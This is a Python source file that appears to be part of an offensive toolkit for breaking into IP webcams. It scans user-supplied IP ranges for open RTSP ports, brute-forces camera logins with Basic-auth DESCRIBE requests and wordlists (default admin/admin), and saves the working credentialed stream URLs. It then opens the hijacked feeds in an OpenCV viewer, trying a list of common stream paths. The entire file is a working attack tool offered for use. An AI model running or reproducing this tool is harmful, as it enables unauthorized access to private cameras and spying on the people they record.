import socket
import tqdm
import threading
import base64
import tabulate
import re
import queue
import time
import os
os.environ["OPENCV_LOG_LEVEL"]="SILENT"
import cv2
import sys

from pathlib import Path

about = "bruteforcing webcams by http/https"
class main(object):
    def __init__(self):
        self.reset()
        self.password_list = None
        self.login_list = None
        self.running = True
        self.ip_ranges = []
        self.founded_targets = []
        self.brute_result = []
        self.port = 554
        self.threads = 20
        self.scan_timeout = 2
    
    def reset(self):
        scan = os.path.normpath(os.getcwd() + "/temp/IpCams_scan_result.txt")
        brute = os.path.normpath(os.getcwd() + "/temp/IpCams_brute_result.txt")
        if os.path.exists(scan):
            os.remove(scan)
        if os.path.exists(brute):
            os.remove(brute)
            
        fp = open(scan, 'x')
        fp.close()
        fp = open(brute, 'x')
        fp.close()
        
    def run(self):
        while self.running:
            command = input("$[ IpCams ]>> ")
            command = command.split(" ")
            
            if command[0] == "set":
                if len(command) < 3:
                    print('[ Wrong syntax ]')
                else:
                    match (command[1]):
                        case "ip_ranges":
                            try:
                                self.ip_ranges = command[2].split(",")
                                print(f"[ ip_ranges > {len(self.ip_ranges)} ]")
                            except Exception as e:
                                if "--debug" in sys.argv:
                                    print(e.with_traceback(e))
                                else:
                                    print(f"[ value must be list]")
                                    
                        case "port":
                            try:
                                self.port = int(command[2])
                                print(f"[ port > {self.port} ]")
                            except Exception as e:
                                if "--debug" in sys.argv:
                                    print(e.with_traceback(e))
                                else:
                                    print(f"[ value must be num]")
                        case "scan_timeout":
                            try:
                                self.scan_timeout = int(command[2])
                                print(f"[ scan_timeout > {self.scan_timeout} ]")
                            except Exception as e:
                                if "--debug" in sys.argv:
                                    print(e.with_traceback(e))
                                else:
                                    print(f"[ value must be num]")
                        case "password_list":
                            try:
                                self.password_list = str(command[2])
                                print(f"[ password_list > {self.password_list} ]")
                            except Exception as e:
                                if "--debug" in sys.argv:
                                    print(e.with_traceback(e))
                                else:
                                    print(f"[ value must be path]")
                        case "login_list":
                            try:
                                self.login_list = str(command[2])
                                print(f"[ login_list > {self.login_list} ]")
                            except Exception as e:
                                if "--debug" in sys.argv:
                                    print(e.with_traceback(e))
                                else:     
                                    print(f"[ value must be path]")
                        case _:
                            print("[ Wrong option name ]")
                        
            if command[0] == "load_targets":
                try:
                    self.load_targets(command[1])
                except Exception as e:
                    if "--debug" in sys.argv:
                        print(e.with_traceback(e))
                    else:  
                        print('[ print(f"[ value must be path]") ]')
            
            if command[0] == "show":
                print(f"ip_ranges: {len(self.ip_ranges)}", end="\n")
                print(f"founded_targets: {str(len(self.founded_targets))}", end="\n")
                print(f"login_list: {str(self.login_list)}", end="\n")
                print(f"password_list: {str(self.password_list)}", end="\n")
                print(f"port: {str(self.port)}", end="\n")
                print(f"scan_timeout: {str(self.scan_timeout)}", end="\n")
        
        
            if command[0] == "run":
                if len(command) != 2:
                    print("[ run scan/brute ]")
                else:        
                    if command[1] == "scan":
                        self.module_scan_run()
                        print(f"[ Targets Found: {len(self.founded_targets)} ]")
                    if command[1] == "brute":
                        self.module_brute_run()
            
            if command[0] == "view":
                RTSP_Viewer().run()            
            
            if command[0] == "quit":
                return 0
            
            if command[0] == "clear":
                os.system("cls||clear")
            
            if command[0] == "help":
                
                help = [
                    ["start scan","start scanning ips to find cams"],
                    ["start brute","start brute forcing cams"],
                    ["show","show options of tool"],
                    ["set [option] [value]","set value of option"],
                    ["view", "cams viewer"]                    
                ]
                
                print(tabulate.tabulate(help, tablefmt="simple_grid"))
            
    def module_scan_run(self):
        for ip_range in self.ip_ranges: 
            self.scan_for_targets(ip_range)
        with open(os.path.normpath(os.getcwd() + "/temp/IpCams_scan_result.txt"), "w+") as f:
            for ip in self.founded_targets:
                f.write(f"{ip}\n")
            print("[ Result saved in IpCams_scan_result.txt ]")
    
    def load_targets(self, path):
        with open(path, "r") as f:
            ips = f.read()
        self.founded_targets = ips.split("\n")
        print(f"[ Loaded {len(self.founded_targets)} targets ]")
    


    def module_brute_run(self):
        if len(self.founded_targets) > 0:
            if self.login_list is None:
                    self.login_list = "admin"
                    
            if self.password_list is None:
                self.password_list = "admin"
                
            print(self.founded_targets)
            url = RtspBrute(self.founded_targets, self.login_list, self.password_list, self.port ).run() 
            if url is not None:
                self.brute_result.append(url)
                print("[ Result saved in IpCams_brute_result.txt ]")
                
            print(f"[ Total - {len(self.brute_result)} ]")
            
    def scan_for_targets(self, ip_range):
        range_start_end = ip_range.split("-")
        start_ip = range_start_end[0].split(".") 
        end_ip =  range_start_end[1].split(".") 
        ips = list()
        for a in range(int(start_ip[0]), int(end_ip[0])+1):
            for b in range(int(start_ip[1]), int(end_ip[1])+1):
                for c in range(int(start_ip[2]), int(end_ip[2])+1):
                    for d in range(int(start_ip[3]), int(end_ip[3])+1):   
                        ips.append(f'{str(a)}.{str(b)}.{str(c)}.{str(d)}')
                        
        threads = []
        for num in range(0,len(ips)):
            threads.append(threading.Thread(target=self.port_check, args=(ips[num], int(self.port))))
                
        for thread in range(0,len(threads)):
            threads[thread].start()
            
        for thread in tqdm.tqdm(range(0,len(threads))):    
            threads[thread].join()
                        
    def port_check(self,ip, port):
        target = socket.gethostbyname(ip)
        socket.setdefaulttimeout(self.scan_timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ans = s.connect_ex((target,port))
        s.close()
        if ans == 0:
            self.founded_targets.append(ip)
            
#####################################################           
            
class RtspBrute(object):
    def __init__(self, targets, username, password, port):
        self.port = port
        self.brute_result = None
        self.targetlist = targets
        self.usernamelist = self.param_to_list(username)
        self.passwordlist = self.param_to_list(password)

    def run(self):
        threads = 100
        global q
        q = queue.Queue()
        for _target in self.targetlist:
            q.put(_target)

        threads = min(len(self.targetlist), threads)
        _threads = []
        for i in range(threads):
            t = threading.Thread(target=self.brute_force, args=())
            _threads.append(t)
        for t in _threads:
            t.setDaemon(True)
            t.start()
        for t in _threads:
            t.join()
        return self.brute_result
    
    def vaild_target(self, target):
        regex = re.compile(
            r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
        result = re.search(regex, target)
        if result:
            return result[0]
        else:
            return None

    def param_to_list(self, param, method=""):
        list = set()
        path = Path(param)
        if path.exists() and path.is_file():
            with open(path, encoding='utf-8', errors='ignore') as file:
                for line in file:
                    if line is not None:
                        if method == "":
                            list.add(line.strip())
                        elif method == "target":
                            line = self.vaild_target(line.strip())
                            list.add(line.strip() + ":" + str(self.port))
            return list
        else:
            if method == "":
                list = param.split(',')
            elif method == "target":
                list = param.split(',')
                for i in range(len(list)):
                    list[i] = list[i]+':'+str(self.port)
            return list

    def rtsp_request(self, target, username="", password=""):
        if username:
            auth = username + ":" + password
            auth_base64 = base64.b64encode(auth.encode()).decode()
            req = "DESCRIBE rtsp://{} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {}\r\n\r\n".format(target,auth_base64)
        else:
            req = "DESCRIBE rtsp://{} RTSP/1.0\r\nCSeq: 2\r\n\r\n".format(
                target)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        try:
            s.connect((target.split(":")[0], int(target.split(":")[1])))
            s.sendall(req.encode())
            data = s.recv(1024).decode()
            return data

        except Exception:
            return

    def brute_force(self):
        with open(os.path.normpath(os.getcwd() + "/temp/IpCams_brute_result.txt"), "a+") as f:
            file = f.readlines()
            
        while not q.empty():
            target = q.get()
            # print(target)
            data = self.rtsp_request(target=target)
            if data and data is not None:
                if "401 Unauthorized" in data:
                    # print("401 Unauthorized")
                    for username in self.usernamelist:
                        for password in self.passwordlist:
                            # print(password)
                            if data is not None:
                                if "WWW-Authenticate: Basic" in data:
                                    data = self.rtsp_request(target, username, password)
                                    if data is not None:
                                        if "200 OK" in data:
                                            res = str("rtsp://{}/av1&user={}&password={}".format(target, username, password))
                                            if res not in file:
                                                print(res)
                                                self.brute_result = res
                                                with open(os.path.normpath(os.getcwd() + "/temp/IpCams_brute_result.txt"), "a+") as f:
                                                    f.writelines(f"\n{res}")
                                            pass
                                        if "401 Unauthorized" in data:
                                            time.sleep(1)
                                            # print("401 Unauthorized")
                                            continue
                        pass
                elif "200 OK" in data:
                    
                    res = str(f"rtsp://{target}/av1")
                    if res not in file:
                        print(res)
                        self.brute_result = res
                        with open(os.path.normpath(os.getcwd() + "/temp/IpCams_brute_result.txt"), "a+") as f:
                            f.writelines(f"\n{res}")
                else:
                    pass
                    # print("Unkonwn problem from %s" % target)
                    # print(data)
            else:
                pass
        pass
    
class RTSP_Viewer(object):
    def __init__(self):
        self.path_list=[
            "av0",
            "Streaming/Channels/101",
            "h264/ch01/main/av_stream",
            "h264/ch01/sub/av_stream",
            "live/h264",
            "&channel=1&stream=0.sdp?",
            "1",
            "2",
            "cam/realmonitor?channel=1&subtype=0",
            "live/main",
            "live/sub",
            "streaming/video0",
            "streaming/video1"
        ]
        self.in_use = False
        self.kill_threads = False
        self.last_window = str()
        self.rtsp_list = self.get_rtsp_file()
        self.running = True
    def run(self):
        list_len = len(self.rtsp_list)
        camera_num = 0
        _video_windows = []
        while self.running:
            if self.kill_threads:
                self.kill_threads = False
                
            try:
                win = threading.Thread(target=self.camera_capture ,args=(camera_num, self.rtsp_list, self.path_list))
                win.start()
                _video_windows.append(win)
                self.last_window = str(f'Camera_{camera_num}')
            except Exception as e:
                print(e.with_traceback(e))
            command = str(input(f"cameras[now {camera_num}]>> ")).split(" ")
            
            if command[0] == "quit":
                return 0
            
            if command[0] == "clear":
                os.system("cls||clear")
            
            if command[0] == "get":
                camera_num = int(command[1])-1
                self.kill_threads = True
            
            if command[0] == "next":
                camera_num += 1
                self.kill_threads = True
                
            if command[0] == "back":
                camera_num -= 1
                self.kill_threads = True
                
            if camera_num == -1:
                camera_num = list_len
                
            if camera_num == list_len:
                camera_num = 0
            
            if command[0] == "help":
                
                help = [
                    ["next","next camera"],
                    ["back","previous camera"],
                    ["get [cam_number]","get camera by id"],          
                ]
                
                print(tabulate.tabulate(help, tablefmt="simple_grid"))
            
            
    def get_rtsp_file(self):
        with open(os.path.normpath(os.getcwd() + "/temp/IpCams_brute_result.txt"), "a+") as f:
            return f.readlines()
        
    def camera_capture(self, num, rtsp_list, path_list):
        path_num = 0
        print("ESC to close preview", end="\n")
        print(f"{num+1}/{len(rtsp_list)}", end="\n")
        video = cv2.VideoCapture(rtsp_list[num])
        run = True
        while run and not self.kill_threads:
            ret ,frame = video.read()
            if ret == False:
                if path_num == len(path_list):
                    break
                else:
                    url = rtsp_list[num].replace("av1",path_list[path_num])
                    print(f"Trying to connect: {path_num}/{len(path_list)}\n", end="")
                    try:
                        video = cv2.VideoCapture(url)
                    except Exception:
                        pass
                    path_num += 1
            else:
                if not self.in_use:
                    self.in_use = True
                cv2.imshow(f'Camera_{num}', frame)
                if cv2.waitKey(50) == 27:
                    run = False
        print("\n\n")
        video.release()
        try:
            cv2.destroyWindow(f'Camera_{num}')
        except Exception:
            print("No Window", end="")
        